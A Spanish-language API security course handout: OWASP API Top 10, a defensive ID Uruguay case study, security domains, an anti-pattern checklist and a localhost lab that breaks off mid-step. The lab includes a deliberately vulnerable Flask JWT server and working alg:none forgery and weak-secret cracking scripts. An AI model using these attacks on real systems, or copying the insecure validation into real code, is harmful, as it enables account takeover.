| API4 | **Unrestricted Resource Consumption** | Paginación gigante, búsquedas costosas; medí CPU/latencia en tu lab | ab, k6 |
| API5 | **BFLA** — Broken Function Level Authorization | Con usuario normal, llamá endpoints de admin (`/admin/...`) | Postman |
| API6 | **Sensitive Business Flows** | Repetí un flujo (cupón, reintento de pago) más veces de las permitidas | script propio |
| API7 | **SSRF** | Endpoint que recibe una URL: apuntalo a `http://localhost`/metadatos en tu lab | Burp Collaborator |
| API8 | **Misconfiguration** | CORS `*`, errores verbosos, métodos no documentados, TLS débil | nuclei, ZAP |
| API9 | **Improper Inventory** | Versiones viejas (`/v1`, `/beta`, `/swagger`) expuestas | ffuf, gobuster |
| API10 | **Unsafe Consumption** | Confiar en datos de terceros (respuesta de otro servicio) sin validar | manual |

**Laboratorios oficiales/diseñados para romper:** [OWASP crAPI](https://owasp.org/projects/crapi), DVGA, [OWASP Juice Shop](https://owasp.org/www-project-juice-shop/), VAmPI, y los labs de [PortSwigger Web Security Academy](https://portswigger.net/web-security) (JWT, OAuth, BOLA).

---

## M11 — Caso ID Uruguay (laboratorio ético)

### Qué es
**ID Uruguay** es el proveedor de identidad del Estado uruguayo, gestionado por **AGESIC**. Se integra vía **OpenID Connect** y su documentación técnica muestra el *token endpoint* `/oidc/v1/token` con **`token_type` = "Bearer"**, un **ID token** en formato **JWT**, y llamadas a *UserInfo* con `Authorization: Bearer`.

- Documentación oficial: https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/comunicacion/publicaciones/documentacion-tecnica-id-uruguay/documentacion-tecnica-id-uruguay/id-0
- Guía "Desarrollo seguro" (AGESIC): https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/sites/agencia-gobierno-electronico-sociedad-informacion-conocimiento/files/Desarrollo%20seguro.pdf

### La línea ética, explícita
- **Vos podés** ejecutar el flujo completo **con tu propia cuenta** y **tu propio cliente de desarrollo** (o el de tu organización, con autorización interna). Eso incluye observar tus tokens, decodificar tu ID token y verificar la configuración de *tu* integración.
- **Vos NO podés** (sin autorización escrita de AGESIC): probar `redirect_uri` de otros clientes, atacar al IdP, automatizar intentos, intentar acceder a datos de otras personas, ni "probar qué pasa si cambio el token".
- Si querés evaluar el IdP en sí: coordiná con **AGESIC** y canalizá por **CERTuy** (`https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/`).

### Verificación defensiva de tu integración (permitida y útil)

| Control | Cómo verificarlo en TU cliente | Resultado esperado | Referencia |
|---|---|---|---|
| **PKCE obligatorio** | Revisá tu `authorization` request: `code_challenge` + `code_challenge_method=S256` | Presente y verificado | RFC 7636 / RFC 9700 |
| **`redirect_uri` exacta** | Confirmá que registrás la URI exacta (sin comodines) y que tu app la valida | Coincidencia exacta | RFC 9700 |
| **`state` y `nonce`** | Verificá que tu app genera y valida ambos | Presentes, aleatorios, de un solo uso | OIDC Core |
| **Validación del ID token** | Tu código debe validar `iss`, `aud`, `exp`, `nonce` y la firma contra JWKS | Todo validado | OIDC Core |
| **ID token no se usa como access token** | Buscá en tu código si el ID token se envía a APIs | Nunca | OIDC Core |
| **Vida del access token** | Decodificá tu access token (si es JWT) y mirá `exp` | Corta y acorde al riesgo | RFC 9068 |
| **Rotación de refresh token** | Pedí dos veces seguidas: ¿el refresh cambia y el viejo se invalida? | Rotación + detección de reuso | RFC 9700 |
| **Revocación / logout** | Cerrá sesión y probá si tu token/refresh ya no sirve | Invalidado | RFC 7009 |
| **Transporte** | Verificá TLS y que no se acepten tokens por HTTP ni en query | Sólo HTTPS + header | RFC 9700 |
| **Almacenamiento en tu cliente** | ¿Dónde guarda tu app el token? (memoria/cookie `HttpOnly` mejor que `localStorage`) | Sin acceso por JS | OWASP |

### Guion de la demostración en clase (sin riesgo)
1. Mostrá la **documentación oficial** de ID Uruguay: `token_type: Bearer` e ID token JWT. *(Cero pruebas a nadie.)*
2. En **tu propio** login con tu cuenta, abrí DevTools → Network y mostrá la respuesta del *token endpoint* y la cabecera `Authorization: Bearer` **enmascarando el token**.
3. Decodificá **tu** ID token en https://jwt.io (es cliente: no viaja a ningún servidor) y leé `iss`, `aud`, `exp`, `auth_time`, `amr`.
4. Cerrá sesión y explicá por qué ese cierre debe invalidar los artefactos.
5. Frase: *"No tocamos ningún sistema ajeno: miramos un billete al portador en nuestra propia billetera."*

---

## 6. La seguridad de API más allá del token: el cuerpo completo, dominio por dominio

![Arquitectura de referencia de una API segura](img/12_reference_arch.png)

Las secciones anteriores cubren **tokens** (Sección 3, módulos M1–M11). Pero una API segura se construye en **todos** los dominios del sistema. Esta sección recorre, uno por uno, cada dominio de seguridad de API, con: qué protege, controles, fallas típicas, cómo se prueba y qué decía ya la bibliografía. Es el complemento que hace que la clase sea completa: el token es una puerta, no el edificio.

> Recordatorio ético: cualquier prueba ofensiva va contra laboratorios o entornos autorizados (ver Sección 0 y la Sección 5 de laboratorio).

### 6.1 Identidad: humana, no humana y delegada

**Qué protege:** saber *quién* o *qué* actúa, antes de decidir *qué puede hacer*.

- **Identidad humana:** personas frente a un proveedor de identidad (OIDC), con sesión, MFA y claims (`sub`, `acr`, `amr`, `auth_time`).
- **Identidad no humana (NHI):** service accounts, workloads, jobs de CI, dispositivos IoT. Su ciclo de vida —nacer, rotar, morir— es donde más falla la industria.
- **Identidad delegada:** un servicio actuando en nombre de una persona (OAuth), con consentimiento, alcance y revocación.

**Controles:** federación de identidad, identidad de workload (p. ej. SPIFFE/SPIRE), credenciales efímeras (STS), rotación automática, mínimo privilegio, inventario y dueño por identidad.

**Fallas típicas:** cuentas compartidas, usuarios genéricos (`admin`, `service`), credenciales de máquina sin expiración, secretos en repos y CI.

**Cómo se prueba (lab/autorizado):** inventariar NHIs; verificar que cada credencial expira y rota; buscar secretos en **tus** repos con `gitleaks`/`gghshield`.

**Fuentes:** NIST SP 800-63-4 (2025); SPIFFE (CNCF, 2017-); GitGuardian, *State of Secrets Sprawl 2026*.

### 6.2 Autenticación: patrones y su evolución

**Qué protege:** comprobar la identidad declarada.

- **Factores:** conocimiento (contraseña), posesión (dispositivo, clave), inherencia (biometría). MFA = dos de tipos distintos.
- **Passwordless y passkeys:** WebAuthn (W3C, 2019) resiste phishing por diseño; alineado con NIST SP 800-63-4 (2025).
- **Entre servicios:** client credentials (RFC 6749 §4.4), `private_key_jwt` (RFC 7523), mTLS (RFC 8705).
- **APIs:** bearer (RFC 6750), y su evolución sender-constrained: DPoP (RFC 9449).

**Fallas típicas:** MFA por SMS, sin rate limit, sin step-up para operaciones sensibles, tokens de vida larga, `alg` tomado del token.

**Cómo se prueba:** N intentos contra **tu** login y medir bloqueo; intentar `alg:none` y confusión HS/RS contra tu lab (ver Sección 5 / Módulo M6).

**Fuentes:** OWASP API2:2023 *Broken Authentication*; NIST SP 800-63-4 (2025).

### 6.3 Autorización: el corazón (donde vive BOLA)

**Qué protege:** decidir si *esta* identidad puede hacer *esta* acción sobre *este* objeto.

- **Modelos:** RBAC (roles), ABAC (atributos), ReBAC (relaciones), PBAC (políticas). En la práctica se combinan.
- **Niveles:** a nivel de **función** (¿puede llamar `/admin`?) y a nivel de **objeto** (¿puede ver el pedido 5678?).
- **Policy as code:** motores como OPA/Rego o Cedar para centralizar y versionar la política.
- **Mediación completa:** toda decisión pasa por un punto de control; nada de "el front ya oculta el botón".

**Fallas típicas (las tres de OWASP API):**
- **BOLA (Api1):** token válido + objeto ajeno. La nº 1 de la lista; ~40 % de los ataques a APIs la involucran.
- **BFLA (Api5):** llamar funciones para las que no hay permiso.
- **BOPLA (Api3) / mass assignment:** controlar propiedades que no deberías (`rol`, `saldo`).

**Cómo se prueba (lab):** con **tu** token, cambiar el ID del objeto; con usuario normal, llamar endpoints de admin; enviar campos extra.

**Fuentes:** OWASP API Security Top 10 (2023); principios de Saltzer & Schroeder (1975); *confused deputy* (Norm Hardy, 1988).

### 6.4 Gateway, API management, service mesh y WAF

**Qué protege:** el punto de entrada y el tránsito entre servicios.

- **API Gateway:** enrutamiento, autenticación, cuotas, transformación, observabilidad en un punto común.
- **API management:** catálogo, versiones, portales, claves, planes, analítica.
- **Service mesh:** mTLS, identidad de workload y políticas entre servicios (este-oeste).
- **WAF:** filtrado de ataques conocidos; complementa, no reemplaza, la validación en la app.

**Fallas típicas:** rutas no documentadas que evitan el gateway, políticas solo en el borde y no en el interior, WAF como única defensa, configuración por defecto.

**Cómo se prueba:** buscar rutas alternativas (`/v1`, `/internal`, `/swagger`, IP directa del servicio) que evadan el gateway; medir si las cuotas se aplican de forma consistente.

**Fuentes:** OWASP API8:2023 *Security Misconfiguration*; Zero Trust (NIST SP 800-207).

### 6.5 Control de consumo y anti-abuso

**Qué protege:** disponibilidad, costo y equidad del servicio.

- **Rate limiting** (por IP, token, usuario, API key), **cuotas** por plan, **throttling**, límites de **concurrencia**.
- **Bot management:** distinguir automatización legítima de abusiva.
- **Límites específicos:** tamaño de request, profundidad de GraphQL, costo de consultas, paginación máxima.

**Fallas típicas:** ausencia de `429`/`Retry-After`, límites solo por IP (trivial de rotar), GraphQL sin límite de profundidad, endpoints costosos sin cuota.

**Cómo se prueba (lab):** enviar N requests y medir si hay `429`; en tu lab GraphQL, enviar una consulta anidada profunda.

**Fuentes:** OWASP API4:2023 *Unrestricted Resource Consumption*.

### 6.6 Validación de entrada e inyección

**Qué protege:** que la entrada no cambie el significado de lo que hace el sistema.

- **Inyección:** SQL, NoSQL, comandos del sistema, LDAP, plantillas (SSTI).
- **SSRF:** el servidor es inducido a pedir una URL interna (metadatos cloud, `localhost`).
- **XXE:** entidades externas XML (SOAP, parsers XML).
- **Deserialización insegura:** objetos que al reconstruirse ejecutan código o cambian estado.
- **Mass assignment:** ver 4.3.
- **Defensa:** validación por lista blanca, tipado estricto, parametrización, deserialización sin código, allowlist de dominios salientes.

**Cómo se prueba (lab):** crAPI/DVGA/Juice Shop; Burp Collaborator para SSRF; PortSwigger labs.

**Fuentes:** OWASP API7:2023 *SSRF*; OWASP Top 10 (2021).

### 6.7 Transporte y red

**Qué protege:** confidencialidad, integridad y autenticidad del canal.

- **TLS** obligatorio; **mTLS** para autenticación mutua; **HSTS**; cifrados modernos; deshabilitar versiones viejas.
- **HTTP/2 y HTTP/3 (QUIC)** cambian supuestos de proxies e inspección.
- **CORS** bien acotado (no `*` con credenciales); **cabeceras de seguridad**.
- **Pinning** en clientes móviles (con sus propios riesgos de operación).

**Fallas típicas:** protocolos obsoletos, terminación TLS en un punto no confiable, CORS permisivo, tokens viajando por HTTP, certificados sin rotación.

**Cómo se prueba:** escanear cifrados (testssl.sh) contra **tu** endpoint; revisar CORS con un origen propio.

**Fuentes:** RFC 9700 (2025); OWASP API8:2023.

### 6.8 Exposición de datos, errores e información

**Qué protege:** no entregar más de lo necesario, ni señalar de más.

- **Data minimization:** devolver solo los campos que el consumidor necesita.
- **Errores:** mensajes verbosos que revelan stack, rutas, versiones o existencia de recursos.
- **Sobre-exposición:** `debug`, *introspection*, endpoints de estado (health, metrics) abiertos.
- **Logs:** nunca registrar tokens, contraseñas ni PII sin protección.

**Cómo se prueba:** provocar errores y leer la respuesta; pedir un recurso inexistente y ver si el error filtra.

**Fuentes:** OWASP API3:2023 *BOPLA*; OWASP API8:2023.

### 6.9 Inventario, versionado y ciclo de vida

**Qué protege:** saber qué APIs existes y cuáles siguen vivas.

- **Descubrimiento y catálogo:** toda API con dueño, propósito y clasificación.
- **Versionado y deprecación:** plan explícito para retirar versiones viejas.
- **Shadow / zombie APIs:** olvidadas, sin mantenimiento, sin protección.

**Fallas típicas:** `/v1` y `/beta` expuestas, documentación pública de endpoints internos, servicios retirados pero accesibles.

**Cómo se prueba:** fuzzing de rutas y versiones contra **tu** entorno; revisar el catálogo.

**Fuentes:** OWASP API9:2023 *Improper Inventory Management*.

### 6.10 Observabilidad, detección y respuesta

**Qué protege:** que puedas ver y reaccionar.

- **Logging** estructurado (sin secretos) y **trazas** distribuidas.
- **SIEM** y detección de anomalías: token usado desde dos geografías, picos de error, enumeración de IDs.
- **Revocación** (RFC 7009) e **introspección** (RFC 7662).
- **Respuesta a incidentes:** playbooks para "token filtrado", "credencial de CI expuesta", "abuso masivo".

**Fallas típicas:** no saber qué tokens están vivos; no poder revocar un refresh; no detectar reuso.

**Cómo se prueba:** simular el robo de **tu** token y verificar si el sistema lo detecta o lo revoca.

**Fuentes:** RFC 7009 (2013); RFC 7662 (2015); NIST SP 800-61 (respuesta a incidentes).

### 6.11 Cadena de suministro y CI/CD

**Qué protege:** que el software y sus dependencias no introduzcan el próximo incidente.

- **Secretos en el pipeline:** escaneo de repos y de CI (`gitleaks`, `ggshield`, `trufflehog`), *secret managers*, rotación.
- **Dependencias:** SBOM, análisis de composición (SCA), fijado de versiones, revisión de mantenedores.
- **Pipeline hardening:** permisos mínimos del runner, aislamiento, *builds* reproducibles, firma de artefactos (SLSA).
- **Consumo de terceros:** no confiar en respuestas de servicios externos sin validar (Api10 de OWASP).

**Fallas típicas:** tokens de CI con permisos amplios, acciones de terceros sin pin de commit, dependencias abandonadas.

**Cómo se prueba:** correr un escáner de secretos en **tu** repo; revisar permisos del `GITHUB_TOKEN` en tu pipeline.

**Fuentes:** OWASP API10:2023 *Unsafe Consumption of APIs*; caso Codecov (2021); SLSA.

### 6.12 Disponibilidad y resiliencia

**Qué protege:** la "A" de la tríada CIA.

- **Resistencia a DoS/DDoS:** límites, *shaping*, absorción en el borde.
- **Backpressure y circuit breakers:** evitar fallos en cascada.
- **Degradación elegante:** responder con lo esencial cuando una dependencia falla.
- **Continuidad:** planes de recuperación, *failover*, pruebas.

**Fallas típicas:** endpoints costosos sin cuota, falta de timeouts, dependencias sin aislamiento.

**Fuentes:** OWASP API4:2023; NIST SP 800-160 (ingeniería de sistemas resilientes).

### 6.13 Lógica de negocio, fraude y abuso

**Qué protege:** que la API se use para lo que fue diseñada.

- **Abusos frecuentes:** scraping, escalping de stock, cupones repetidos, creación masiva de cuentas, *referral fraud*, abuso de reembolsos.
- **Detección:** límites por *flujo* (no solo por request), reglas de negocio, correlación entre identidades y patrones.

**Fallas típicas:** el ataque es una secuencia de llamadas válidas en orden indebido o en exceso.

**Cómo se prueba (lab):** repetir un flujo legítimo más veces de las previstas y observar si el sistema lo frena.

**Fuentes:** OWASP API6:2023 *Unrestricted Access to Sensitive Business Flows*.

### 6.14 Diseño seguro y threat modeling

**Qué protege:** resolver el riesgo **antes** de codificar.

- **Metodologías:** STRIDE (amenazas), LINDDUN (privacidad), PASTA (riesgo), DREAD (priorización), árboles de ataque.
- **Insumos:** diagramas de flujo de datos, límites de confianza, activos, actores.
- **Salida:** amenazas priorizadas con controles y dueños.

**Fallas típicas:** hacer threat modeling una vez y archivarlo; no involucrar a producto.

**Fuentes:** Microsoft STRIDE; OWASP Threat Modeling; NIST SP 800-154.

### 6.15 Zero Trust aplicado a APIs

**Qué protege:** elimina la confianza implícita del perímetro.

- **Principios:** verificar explícitamente, mínimo privilegio, asumir la brecha.
- **En APIs:** cada request se evalúa por identidad y contexto; el tráfico interno también se autentica (mesh/mTLS); políticas por recurso, no por red.
- **En identidad:** sesiones y tokens con vida corta, reevaluación continua, step-up.

**Fuentes:** NIST SP 800-207 (Zero Trust Architecture).

### 6.16 Criptografía y gestión de claves

**Qué protege:** la confianza técnica (firma, cifrado, identidad).

- **JOSE:** JWS (firma), JWE (cifrado), JWK (claves), JWA (algoritmos).
- **PKI y mTLS:** certificados, cadenas, revocación (CRL/OCSP), rotación.
- **Custodia de claves:** KMS/HSM, separación de funciones, rotación, y **preparación poscuántica** (migración a algoritmos resistentes).
- **Errores a evitar:** algoritmos obsoletos, claves compartidas, `alg` desde el token (RFC 8725).

**Fuentes:** RFC 7515–7518 (2015); RFC 8725 (2020); NIST PQC (2024).

### 6.17 Gobierno, madurez y cultura

**Qué protege:** que la seguridad sea **sostenible** y no dependa de héroes.

- **Propiedad:** cada API con dueño, con SLA y con canal de reporte.
- **Madurez:** OWASP SAMM, modelos de madurez de seguridad de API, métricas.
- **Centro de excelencia:** estándares, plantillas, revisión de diseño, capacitación.
- **Diseño como código:** *policy as code*, *infrastructure as code*, pruebas de seguridad en el pipeline.

**Fuentes:** OWASP SAMM; NIST CSF 2.0 (2024).

### 6.18 Cumplimiento y normativa (con Uruguay)

**Qué protege:** que el sistema cumpla lo que la ley y el estándar exigen.

- **Estándares:** ISO/IEC 27001, PCI DSS, NIST, OWASP.
- **Uruguay:**
  - **AGESIC** conduce la estrategia de gobierno digital y ciberseguridad.
  - **Ley 18.331 (2008)** de Protección de Datos Personales y su **Unidad Reguladora (URCDP)**.
  - **Decreto 66/025** de ciberseguridad: obligaciones para organismos y prestadores, incluida la **gestión de incidentes y el reporte a CERTuy**.
  - **CERTuy** (AGESIC): canal oficial de reporte de incidentes — https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/
  - **ID Uruguay**: proveedor de identidad del Estado (OpenID Connect, `token_type: Bearer`), documentación técnica en gub.uy.
- **Traducción a controles:** inventario, gestión de accesos, rotación de secretos, registro de eventos, respuesta a incidentes, divulgación responsable.

### 6.19 Privacidad y protección de datos

**Qué protege:** a las personas cuyos datos tratan las APIs.

- **Principios:** minimización, finalidad, proporcionalidad, retención limitada, residencia, consentimiento.
- **Diseño:** privacidad desde el diseño y por defecto (LINDDUN); *pseudonimización*; cifrado.
- **Derechos:** acceso, rectificación, supresión.
- **En APIs:** no devolver PII de más, no loguearla, no exponerla en errores, y permitir el borrado efectivo (fin del mito "el token es anónimo").

**Fuentes:** Ley 18.331 (Uruguay); URCDP; LINDDUN.

### 6.20 Catálogo de anti-patrones (checklist de lo que NO hacer)

| Anti-patrón | Por qué duele | Qué hacer en su lugar |
|---|---|---|
| Token en la URL/query | Queda en logs, `Referer`, historial, CDN | Cabecera `Authorization` (RFC 9700) |
| Secreto hardcodeado en el cliente | Cualquiera lo extrae del bundle/app | Backend-for-frontend; no confiar en el cliente |
| Autorización solo en el front | El front no es un control | Autorizar en el servidor, a nivel de objeto |
| `alg` tomado del token | `alg:none`, confusión HS/RS | Algoritmo desde la configuración (RFC 8725) |
| JWT de larga vida sin revocación | No se puede cortar | Vida corta + rotación/introspección |
| Refresh token enviado a la API | Confusión de roles | Solo contra el endpoint de token |
| ID token usado como access token | Token para la app, no para el recurso | Access token para la API |
| Firma no verificada | Cualquiera forja tokens | Verificar firma siempre |
| Sin validación de `aud`/`iss` | Token robado de otra app sirve | Validar emisor y audiencia |
| Rate limit solo por IP | Trivial de rotar | Limitar por identidad y por recurso |
| Paginación sin tope | Consumo ilimitado | Límites máximos y cuotas |
| Errores verbosos | Filtran rutas y versiones | Mensajes genéricos al cliente |
| CORS `*` con credenciales | Cualquier sitio llama | Orígenes explícitos |
| mTLS terminado en proxy sin reenvío de identidad | Se pierde la identidad del cliente | Propagar la identidad verificada |
| Cuentas de servicio compartidas | No hay trazabilidad | Identidades únicas y de vida corta |
| API keys eternas | Sin rotación ni revocación | Rotación, revocación, allowlist |
| `introspection`/`debug` abiertos | Fuga de información | Cerrar en producción |
| Versionado incontrolado | Shadow/zombie APIs | Catálogo y deprecación |
| Confiar en datos de terceros | Inyección por cadena de suministro | Validar toda entrada externa (Api10) |
| Logs con tokens o PII | Fuga por observabilidad | Redacción y minimización |

### 6.21 Fuentes ampliadas de esta sección

- **OWASP:** [API Security Top 10 (2023)](https://owasp.org/API-Security/editions/2023/en/0x11-t10/) · [WSTG](https://owasp.org/www-project-web-security-testing-guide/) · [SAMM](https://owasp.org/www-project-samm/) · [Cheat Sheets](https://cheatsheetseries.owasp.org/)
- **NIST:** [SP 800-63-4 (2025)](https://pages.nist.gov/800-63-4/) · [SP 800-207 Zero Trust](https://csrc.nist.gov/pubs/sp/800/207/final) · [SP 800-61 (IR)](https://csrc.nist.gov/pubs/sp/800/61/r2/final) · [Cybersecurity Framework 2.0](https://www.nist.gov/cyberframework)
- **IETF:** RFC 6749 · 6750 · 7515–7519 · 7523 · 7636 · 7662 · 7009 · 8176 · 8252 · 8705 · 8725 · 9068 · 9449 · 9700
- **Uruguay:** [CERTuy](https://www.gub.uy/centro-nacional-respuesta-incidentes-seguridad-informatica/) · [AGESIC](https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/) · [Ley 18.331 — URCDP](https://www.gub.uy/unidad-reguladora-control-datos-personales/) · Documentación técnica de [ID Uruguay](https://www.gub.uy/agencia-gobierno-electronico-sociedad-informacion-conocimiento/comunicacion/publicaciones/documentacion-tecnica-id-uruguay/documentacion-tecnica-id-uruguay/id-0)
- **Laboratorios:** [OWASP crAPI](https://owasp.org/projects/crapi) · [Juice Shop](https://owasp.org/www-project-juice-shop/) · [PortSwigger Academy](https://portswigger.net/web-security) · DVGA

## 7. Laboratorio paso a paso (con ejemplos)

**Anexo práctico de la clase "De Basic al DPoP".**
Pensado para tenerlo abierto el día de la charla: cada paso tiene comando, resultado esperado y "qué demuestra".

> ⚠️ **Seguridad primero.** Todos los ataques se ejecutan contra **laboratorios locales** (`127.0.0.1`) o endpoints públicos de práctica. **Nunca** contra sistemas de terceros sin autorización escrita. ID Uruguay se aborda **sólo en modo defensivo**, con tu propia cuenta y tu propio cliente.
>
> 🖥️ **Entorno.** Los comandos están en sintaxis bash. En Windows usá **Git Bash** o **WSL2**. Requiere: `docker`, `python` 3.10+, `curl`, `git`, `jq` (opcional). Verificalo en el Paso 0.

### 7.1 Entorno de laboratorio seguro

Levantá todo con Docker, sin tocar producción de nadie.

```bash
# OWASP crAPI (API intencionalmente vulnerable, con BOLA, JWT, etc.)
docker compose --file https://raw.githubusercontent.com/OWASP/crAPI/develop/deploy/docker/docker-compose.yml up -d

# DVGA (Damn Vulnerable GraphQL Application)
git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application && cd Damn-Vulnerable-GraphQL-Application
docker build -t dvga . && docker run -d -p 5013:5013 dvga

# Keycloak (OIDC/OAuth real para practicar PKCE, refresh, DPoP)
docker run -d -p 8080:8080 -e KEYCLOAK_ADMIN=admin -e KEYCLOAK_ADMIN_PASSWORD=admin quay.io/keycloak/keycloak:latest start-dev

# Juice Shop (web + API)
docker run -d -p 3000:3000 bkimminich/juice-shop
```

Herramientas: Burp Suite Community o ZAP, `jwt_tool`, `ffuf`/`gobuster`, `nuclei`, `gitleaks`/`ggshield`, Postman/Insomnia, `k6`/`ab`.

---

### Parte A — Calentamiento sin riesgo

#### Paso 0 — Verificar herramientas

```bash
docker --version
python --version
curl --version | head -1
git --version
```

**Esperado:** versiones de cada herramienta. Si falta `jq`: Windows `winget install jqlang.jq`, Linux `sudo apt install jq`.

#### Paso 1 — HTTP Basic: ver y decodificar credenciales

```bash
## Endpoint público de práctica (NO es un sistema de terceros)
curl -s -u usuario:clave https://httpbin.org/basic-auth/usuario/clave

## Mirar la cabecera que viaja
curl -s -D - -o /dev/null -u usuario:clave https://httpbin.org/basic-auth/usuario/clave | grep -i authorization
```

**Esperado:** JSON `{"authenticated": true, "user": "usuario"}` y una cabecera `Authorization: Basic dXN1YXJpbzpjbGF2ZQ==`.
**Qué demuestra:** las credenciales viajan en **cada** request.

```bash
## Base64 NO es cifrado
echo -n "dXN1YXJpbzpjbGF2ZQ==" | base64 -d; echo
```

**Esperado:** `usuario:clave`.
**Qué demuestra:** cualquiera que intercepte el tráfico lee la credencial.

#### Paso 2 — API key

```bash
curl -s -H "X-API-Key: clave-de-ejemplo" https://httpbin.org/headers | jq '.headers' 2>/dev/null || curl -s -H "X-API-Key: clave-de-ejemplo" https://httpbin.org/headers
```

**Esperado:** aparece `"X-Api-Key": "clave-de-ejemplo"`.
**Qué demuestra:** la clave viaja en claro en una cabecera estática; si se filtra, no expira sola.

```bash
## Buscar secretos en TU propio repositorio (no ajenos)
docker run --rm -v "$PWD":/repo zricethezav/gitleaks:latest detect --source /repo -v
```

**Esperado:** reporte (posiblemente vacío en un repo limpio).
**Qué demuestra:** cómo se descubren claves hardcodeadas en repos y CI.

#### Paso 3 — OAuth 1.0: entender la firma

```bash
cat > oauth1_sign.py <<'PY'
import hmac, hashlib, base64, urllib.parse
method, url = "GET", "https://api.ejemplo.com/recurso"
params = {"oauth_consumer_key": "key", "oauth_nonce": "abc123", "oauth_timestamp": "1700000000"}
base = "&".join([method,
                 urllib.parse.quote(url, safe=""),
                 urllib.parse.quote("&".join(f"{k}={params[k]}" for k in sorted(params)), safe="")])
sig = base64.b64encode(hmac.new(b"secreto", base.encode(), hashlib.sha1).digest()).decode()
print("base string:", base)
print("oauth_signature:", urllib.parse.quote(sig))
PY
python oauth1_sign.py
```

**Esperado:** se imprime la *base string* y una firma.
**Qué demuestra:** cada request se firma; **cambiar un parámetro invalida la firma**. Es la idea que DPoP recupera 13 años después.

> Probalo: cambiá `"abc123"` por `"abc124"` y volvé a correr. La firma cambia por completo.

#### Paso 4 — Bearer: reutilización (sólo tu entorno)

```bash
curl -s -H "Authorization: Bearer token-de-ejemplo" https://httpbin.org/bearer
```

**Esperado:** `{"authenticated": true, "token": "token-de-ejemplo"}`.
**Qué demuestra:** el servidor no distingue quién porta el token; si lo tenés, entrás. (En clase: copiá **tu** token y usalo desde otra terminal contra **tu** API.)

#### Paso 5 — Cookies (opcional, con Juice Shop)

```bash
docker run -d -p 3000:3000 --name juice bkimminich/juice-shop
```

Abrí http://localhost:3000, registrate, y en DevTools → Application → Cookies mirá `HttpOnly`, `Secure`, `SameSite`.
**Qué demuestra:** la diferencia entre sesión en cookie (navegador) y bearer en cabecera (API).

---

### Parte B — Laboratorio JWT

Este laboratorio es **deliberadamente vulnerable** y corre **sólo en local**.

#### Paso 6 — Preparar entorno Python

```bash
mkdir -p jwt-lab && cd jwt-lab
python -m venv .venv
source .venv/Scripts/activate   # Windows Git Bash   (Linux/macOS: source .venv/bin/activate)
pip install flask pyjwt
```

#### Paso 7 — Crear el servidor vulnerable

```bash
cat > lab_jwt.py <<'PY'
## lab_jwt.py — DELIBERADAMENTE VULNERABLE. Sólo 127.0.0.1. NO usar en producción.
from flask import Flask, request, jsonify
import jwt, datetime

app = Flask(__name__)
WEAK_SECRET = "secreto"          # débil a propósito (crackeable)

def bearer():
    return request.headers.get("Authorization", "").replace("Bearer ", "").strip()

def mint(sub="1", scope="read", aud="lab", exp_min=15):
    payload = {"sub": sub, "scope": scope, "aud": aud, "iss": "https://mi-lab",
               "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(minutes=exp_min)}
    return jwt.encode(payload, WEAK_SECRET, algorithm="HS256")

@app.route("/token")
def token():
    return jsonify(token=mint())

@app.route("/vuln/novalida")      # simula verificación ausente
def vuln_novalida():
    return jsonify(ok=True, claims=jwt.decode(bearer(), options={"verify_signature": False}))

@app.route("/vuln/debil")         # secreto débil + no exige exp ni aud
def vuln_debil():
    return jsonify(ok=True, claims=jwt.decode(bearer(), WEAK_SECRET, algorithms=["HS256"],
                                              options={"verify_aud": False, "verify_exp": False}))

@app.route("/safe")               # verificación correcta
def safe():
    claims = jwt.decode(bearer(), WEAK_SECRET, algorithms=["HS256"], audience="lab")
    return jsonify(ok=True, claims=claims)

if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000)
PY
python lab_jwt.py
```

Dejalo corriendo. En **otra** terminal:

```bash
curl -s http://127.0.0.1:5000/token | jq -r .token > token.txt
TOKEN=$(cat token.txt)
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:5000/safe | jq
```

#### Paso 8 — Ataque `alg: none`

```bash
python - <<'PY'
import jwt, datetime
payload = {"sub": "999", "scope": "admin", "aud": "lab", "iss": "https://mi-lab",
           "exp": datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(hours=1)}
forge = jwt.encode(payload, None, algorithm="none")
open("forged_none.txt", "w").write(forge)
print("token forjado:", forge)
PY
FORGED=$(cat forged_none.txt)
echo "--- /vuln/novalida (acepta) ---"
curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:5000/vuln/novalida | jq
echo "--- /safe (debe rechazar) ---"
curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:5000/safe | jq
```

**Esperado:** `/vuln/novalida` devuelve `claims` con `"scope":"admin"`; `/safe` responde error 401.
**Qué demuestra:** si el validador no verifica la firma (o confía en `alg`), el token forjado pasa.

#### Paso 9 — Crackear el secreto débil

```bash
cat > crack.py <<'PY'
import jwt, sys
tok = open("token.txt").read().strip()
words = ["123456","password","secreto","clave","admin","secret","jwt","token"]
for w in words:
    try:
        jwt.decode(tok, w, algorithms=["HS256"], options={"verify_aud": False})
        print("CLAVE ENCONTRADA:", w); sys.exit(0)
    except Exception:
        pass
print("sin suerte (probá una wordlist real)")
PY
python crack.py
```

**Esperado:** `CLAVE ENCONTRADA: secreto`.
**Qué demuestra:** con HS256, un secreto débil equivale a no tener firma. Con una wordlist real (`rockyou.txt`) y `jwt_tool tok -C -d rockyou.txt` el ataque es igual de directo.

#### Paso 10 — Token sin `exp` y con `aud` equivocada

```bash
python - <<'PY'
import jwt
## sin exp, audience distinta
t = jwt.encode({"sub":"777","scope":"admin","aud":"otra-app","iss":"https://mi-lab"},
               "secreto", algorithm="HS256")
open("noexp.txt","w").write(t)
print(t)
PY
T=$(cat noexp.txt)
echo "--- /vuln/debil (acepta) ---"; curl -s -H "Authorization: Bearer $T" http://127.0.0.1:5000/vuln/debil | jq
echo "--- /safe (debe rechazar por aud) ---"; curl -s -H "Authorization: Bearer $T" http://127.0.0.1:5000/safe | jq
```

**Esperado:** `/vuln/debil` acepta; `/safe` rechaza por `audience`.
**Qué demuestra:** los claims `exp`/`aud` **hay que exigirlos**, no basta con que un token los traiga.

#### Paso 11 — (Avanzado) Confusión RS256 → HS256

```bash
openssl genrsa -out priv.pem 2048
